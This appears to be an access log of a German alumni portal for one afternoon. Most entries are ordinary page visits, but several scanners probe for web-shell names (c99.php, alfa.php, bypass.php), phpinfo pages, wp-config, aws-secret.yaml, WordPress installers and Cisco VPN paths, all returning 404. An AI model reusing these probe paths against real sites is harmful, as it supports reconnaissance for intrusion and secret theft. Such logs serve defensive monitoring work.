b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:02;;/lufix.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:02;;/thai.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:03;;/fifi.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:03;;/fifii.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:03;;/667.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:04;;/700.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:04;;/c4.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:04;;/l.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:05;;/ss.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:05;;/up.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:05;;/ant.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:05;;/nij.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:06;;/wteed.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:06;;/racs3.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:07;;/wp-rss4.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:07;;/4563.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:07;;/t3x.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:08;;/we.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:08;;/asd67.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:08;;/zr.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:09;;/unzip.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:09;;/2020.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:10;;/wp-includes/theme-compat/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:10;;/wp-admin/network/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:10;;/wp-content/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:11;;/update/f35.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:11;;/vv.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:11;;/wp-blog.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/dropdown.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/wp-admin/js/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/foo.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/alfa.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:13;;/function/function.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:13;;/v.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:13;;/wp-content/radio.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:14;;/ge.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:14;;/map.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:14;;/wp-admin/maint/admin.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/000.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/images/photo.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/images/c99.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/css/colors/coffee/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:16;;/uploads/form3.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:16;;/terminal.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:16;;/1.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:17;;/checker.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:17;;/wp-includes/compats.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:17;;/kk.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:18;;/img/5/radio.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:18;;/system_log.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:18;;/0x.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/wp-admin/network/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/hi.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/wp-trackback.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:20;;/htaccess.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:20;;/inputs.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:20;;/images/sendme.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:21;;/wp-content/themes/jaida/lang.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:21;;/wp-admin/css/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:21;;/wp-includes/system_log.php?;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:22;;/wp-admin/images/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:24;;/pp.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:25;;/wp-content/themes/twentytwentytwo/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:25;;/css/colors/blue/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:25;;/article.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:26;;/moon.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:26;;/ff.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:26;;/if.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:27;;/av.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:27;;/wp-includes/ID3/about.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:27;;/wp-includes/rest-api/fields/index.php?;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:28;;/wp-includes/SimplePie/Canonical.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:28;;/wp-admin/js/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:28;;/ini.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:29;;/geck.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:29;;/wp-includes//about.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:29;;/a2.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:30;;/moon.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:30;;/wp-admin/404.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:30;;/radio.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:31;;/info.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:31;;/avaa.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:31;;/yanz.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/simple.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/wp-admin/images/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/file.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/bypass.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:33;;/wp-includes/rk2.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:33;;/wp-includes/js/js420.php;GET;404
50c18a9f435930cbdc37d64aaaa31b6029336e2d27b3feb52eda8a2d85748c02;2025-11-04 11:42:58;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
1e1d7277f2111744e5a63d1b440c34ade903441b36a79fd316bc67f54bbd4cfc;2025-11-04 11:43:05;/rechtliches/green-data;/rechtliches/green-data;GET;200
4993851ad3ca5768cbd2130537476df26894081d72896f19772ccc2f05d9cd32;2025-11-04 11:46:03;;/personen/alumni/schule/09A05;GET;200
65241c570a000e7740857c6f2cab8f3c6359f6d8d42eee7d2f728a84d54ea3c8;2025-11-04 11:50:23;;/;GET;200
50291f8e4984fef821837d448f35306e12bacc5ab29eaae78685455b2491545e;2025-11-04 11:52:20;;/;GET;200
d262b977a3a62b7a3fbe309626915ff388dde3e1551ed2963cc595feab5b5315;2025-11-04 11:55:23;;/personen/alumni/schule/5514;GET;200
a15fe33c252be75c0142fe22d9be5cb54c00fb97c396dd754d481716c70700c6;2025-11-04 12:03:51;;/personen/alumni/schule/4240016;GET;200
8bb3a7a3d56a54fd9a65ca8a1aac187fbe7d7c61086581d66a86835ec8528d4c;2025-11-04 12:04:36;;/developmentserver/metadatauploader;GET;404
fb7d1feb05b45954fd80bca69c059ff8177b01bea10652f44bcfadf70ec3003f;2025-11-04 12:12:09;;/personen/alumni/schule/5502;GET;200
cb5a59f0d82c47c26fb9750be96fe4fca34ddf55a510f2f9849b3a7297dbbe19;2025-11-04 12:14:08;;/docs/img/uml-relations.png;GET;404
98cebaaaa1b9dd4c96fe99e46ed6905efda3e997fd755dd365786f0cc6e8fbfa;2025-11-04 12:19:48;;/personen/alumni/schule/0351;GET;200
b5197f20e793da0c1169bd5586720c37d2107dedbec9a22154a38a85d3a49d95;2025-11-04 12:25:37;;/;GET;200
2575123efb97aa7917e63c874b8c1dc4682bf3bc4374c69155a8b5798b4102b9;2025-11-04 12:27:19;;/personen/alumni/schule/59026;GET;200
dc0de6d512764aa1e12df06d0288c7a6d512905633566cb26782d740c3db283b;2025-11-04 12:34:13;;/;GET;200
45f6e015bf37c2420a07c6057d622021c9dcdc063e55e2c65f6ea8f4e86c4394;2025-11-04 12:34:45;;/personen/alumni/schule/4340014;GET;200
2f31db41012a613aeeb9257eee4eeaa90ac19998f1a7c882b2dd115250af3ea3;2025-11-04 12:39:41;;/index.html;GET;404
58bfe8d1dba28119dd0e76ef702fb587690b190c388d5b37e3908ef90c17c4f2;2025-11-04 12:41:55;;/personen/alumni/schule/59000;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 12:46:56;;/personen/alumni/schule/164045;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 12:48:01;/gruppen/hobby/mathematik-wettbewerbe;/personen/alumni/details/albert-hammig;GET;200
3ddd422c08eb2e50d5649dc5626afb0aee66e5a228b26d80e356a09adf55bd16;2025-11-04 12:48:56;;/personen/alumni/schule/65262;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-04 12:53:40;;/;GET;200
6e7adb891466f166d703df09f51756a6d76cbd700d612f2fa80c20476562e673;2025-11-04 12:55:45;;/personen/alumni/schule/5505;GET;200
5e1bb3b150d895a1263d17728a9aa1ed56f3ab5568cd2fe97bf546ae84d11888;2025-11-04 12:58:05;;/;GET;200
8c714fd7b5e05ecb299bac139ce978269344b6ec484ea0cb33f58a29d958df72;2025-11-04 13:02:58;;/personen/alumni/schule/170720;GET;200
37238e9238e1dc325ccbeed37d93a19237c10bd7bc9b905ee39a13bdc6d6601f;2025-11-04 13:10:03;;/personen/alumni/schule/4240404;GET;200
9141c27bfb4017faeeee3efcc2618d98bc3cdb57ebe50019806a4f61670fed07;2025-11-04 13:13:52;;/personen;GET;200
334c4c1a10ab0811cc92acdafc78cacec8f3e3674e53d2b07c481d42273f0082;2025-11-04 13:17:32;;/veranstaltungen;GET;200
4702cb4e588b32daef3f16b62facdb8520f3f611553c477bd54f648696a0dd61;2025-11-04 13:17:42;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
7dd70f4798102f8dc7c4f57392eacb12fc8970c801753e8f37c7bc83f82bba6c;2025-11-04 13:24:25;;/personen/alumni/schule/59013;GET;200
531144f2c5ff450c19d4277e8e85cb0bf8dfc7a549d7e508b6c0c8744dfc8a17;2025-11-04 13:31:07;;/personen/alumni/schule/190627;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 13:36:29;/register;/personen/alumni/schule/5826;GET;200
a6ae396165c11d3b4b340574cd1f0316e959d958a15f298f98177fd06b428d0f;2025-11-04 13:39:19;;/personen/alumni/schule/191073;GET;200
9ff64ac6be6c3c5385829e6f5735a34e822915b4cb093f6a7fe562ca55c01b78;2025-11-04 13:53:47;;/aktuelles/meldungen?category=wissenschaft;GET;200
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:36;;/;GET;200
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:37;;//wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:40;;//xmlrpc.php?rsd;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:41;;/;GET;200
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:43;;//blog/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:45;;//web/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:46;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:48;;//website/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:50;;//wp/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:52;;//news/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:55;;//2020/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:58;;//2019/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:01;;//shop/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:04;;//wp1/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:06;;//test/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:09;;//wp2/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:12;;//site/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:14;;//cms/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:16;;//sito/wp-includes/wlwmanifest.xml;GET;404
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 14:01:56;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
8423a601cc0cc50220477d753a0c2305c97f38a5e0c9fcf128f87cef21a808d6;2025-11-04 14:03:20;;/personen/alumni/schule/09A05;GET;200
c29935f58da8d4a22c80ad3f883fee76fcf429796c0144ba28a5bcd49da25948;2025-11-04 14:11:07;;/personen/alumni/schule/170574;GET;200
7fe6a025f578b8b395f27f915a5c575bb9dd757d175f33c6fa123ee3e1a0cd80;2025-11-04 14:18:05;;/.well-known/assetlinks.json;GET;404
4b0e9389fcfd0c600af4e0694046c102206128284ab51147054b6eee02185081;2025-11-04 14:18:05;;/.well-known/assetlinks.json;GET;404
b60c6c8cd9e3f470dd896f976b26270d3804cb8954e5437501d2373e5aa6fc8f;2025-11-04 14:18:22;;/personen/alumni/schule/0348;GET;200
14ddb6ae05229c8fd3b2611cc22eb9ff633954b4051a950493578bf9d56596bc;2025-11-04 14:23:01;/gruppen/hobby/kulturelle-studien;/gruppen/hobby/kulturelle-studien;GET;200
f7e0c3a398c793c1b82ac4fbbf0d037b5599e2ba9ef074c975dca8ef33253677;2025-11-04 14:25:24;;/personen/alumni/schule/5503;GET;200
fbd921068faf6d0fc6f2055c5639350cc61bb5b0f48783f632fefd82dc18c743;2025-11-04 14:32:33;;/personen/alumni/schule/5508;GET;200
b7cd0ad9e5e498ff093efa93b3ca595434c2b3f419c66a89199a807cb4dbf81d;2025-11-04 14:38:44;;/gruppen/hobby/mathematik-wettbewerbe;GET;200
20cf9e2c4f483b66b2b72f7e2864c8fb1117db4717db9a363ee812be8dc0d108;2025-11-04 14:39:30;;/personen/alumni/schule/5511;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-04 14:39:44;;/?XDEBUG_SESSION_START=phpstorm;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 14:42:31;/register;/personen/alumni/schule/610021;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 14:43:55;/gruppen/hobby/lesen;/personen/alumni/details/jessica-schwarz;GET;200
d42a13ed1f462560d388205c0f0d27782db7a980784e9223f45abf604c3c1752;2025-11-04 14:46:52;;/personen/alumni/schule/4440541;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:24;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:25;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/stellenangebote;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:27;;/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_profiler/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_profiler/phpinfo/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_profiler/phpinfo/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/wp-config;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:38;;/aws-secret.yaml;GET;404
bddaf38dcfee1f49ec2db3bb44c3c75be87bef16a9ac38856effe621ec1a5c11;2025-11-04 14:53:50;;/personen/alumni/schule/170690;GET;200
835a958e4feea51074984a4c4bb8396caf750d308359da30fca8215b80cb7db2;2025-11-04 14:57:03;;/;GET;200
70bb5f34fcb5e4c8341cd59a2dce1029637b433953a3e289b61e8e7f1c99ab70;2025-11-04 15:01:05;;/personen/alumni/schule/5501;GET;200
fd4f83800bc910a053eebcf4966c47261b22ec225a3eb7e4d227b3c8d1690898;2025-11-04 15:05:11;;/personen/alumni/details/luca-onorini;GET;200
0419a51f78b35d19052a06cb2143b386f3f9caa333c880577cfa1e5e29331451;2025-11-04 15:08:19;;/personen/alumni/schule/5506;GET;200
6c339520a1aba428a6c5de612428f9919ae0ff1958bbb3174c0befbd65314a27;2025-11-04 15:12:11;;/;GET;200
fbd3c23d942c3044de11459a40b8b366b8f520c9ed43c5d4bfd8a2df47755cab;2025-11-04 15:15:38;;/personen/alumni/schule/5514;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 15:16:56;;/gruppen/hobby/social-media-management;GET;200
0d88c8980dff4ac6a7d364ee9ce537f7b4000980b17cee481af4877b4356ffbe;2025-11-04 15:22:56;;/personen/alumni/schule/4240016;GET;200
9fd9c917894aa5d24fafde96795cf317d887d1bb1a337095da648325f5c71503;2025-11-04 15:30:03;;/personen/alumni/schule/5502;GET;200
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-04 15:35:12;;/;GET;200
47f1ec1f59236fc573362c1d75fa8081e5d347f1c537dd0f7c97dfb397413fb1;2025-11-04 15:37:33;;/personen/alumni/schule/0351;GET;200
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:25;;/+CSCOL+/Java.jar;GET;404
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:26;;/+CSCOE+/logon_forms.js;GET;404
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:28;;/+CSCOL+/a1.jar;GET;404
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:29;;/+CSCOE+/transfer.js;GET;404
a14bc5cdeb1d0cf62840062b8dcccc98101a1be52207dfef5dd4d69a187291fb;2025-11-04 15:42:42;;/;GET;200
9f0370abd905eb6086fac5f88d4d3425690ffaaf1c38341818bda8bd0be260df;2025-11-04 15:44:34;;/;GET;200
d985c20c25ee0bb134920bc2cbd21aa6aa0187d0d3024d6bf9290395acad7769;2025-11-04 15:49:07;;/aktuelles/meldungen?category=wissenschaft;GET;200
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:11;;/;GET;200
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:37;;/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:40;;/wordpress/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:40;;/wordpress/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:40;;/wp/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:41;;/wp/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:41;;/new/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:41;;/new/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:42;;/old/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:42;;/old/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:42;;/blog/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:42;;/blog/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:43;;/test/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:44;;/test/wp-admin/install.php?step=1&language=en_GB;GET;404
